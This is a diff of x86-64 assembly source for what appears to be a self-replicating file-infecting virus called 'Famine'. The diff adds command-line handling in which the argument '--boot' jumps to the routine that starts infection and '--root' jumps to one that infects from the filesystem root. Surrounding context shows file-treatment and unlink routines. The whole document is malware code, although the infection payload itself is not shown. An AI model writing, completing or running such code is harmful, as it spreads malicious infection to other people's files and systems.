@@ -2,6 +2,7 @@ section .text
     global _start_infect
     global _infect_from_root
     global _verify_starting_infect
+    global _famine_start_options
     extern _final_end
     extern _string
     extern _treat_file
@@ -229,3 +230,32 @@ _unlink:
 _exit_copy:
     leave
     ret
+
+_activate_start_infection:
+    .string db '--boot', 0
+    .len equ $ - _activate_start_infection.string
+
+_activate_root_infection:
+    .string db '--root', 0
+    .len equ $ - _activate_root_infection.string
+
+_famine_start_options:
+    mov rax, QWORD [rsp + 128]
+    cmp rax, 2
+    jne _continue_normaly
+
+_test_options:
+    mov rdi, QWORD [rsp + 144]
+    mov rcx, _activate_start_infection.len
+    lea rsi, [rel _activate_start_infection.string]
+    cld
+    repe cmpsb
+    je _start_infect
+    mov rdi, QWORD [rsp + 144]
+    mov rcx, _activate_root_infection.len
+    lea rsi, [rel _activate_root_infection.string]
+    cld
+    repe cmpsb
+    lea rdi, [rel _exit_properly]
+    je _infect_from_root
+    jmp _continue_normaly
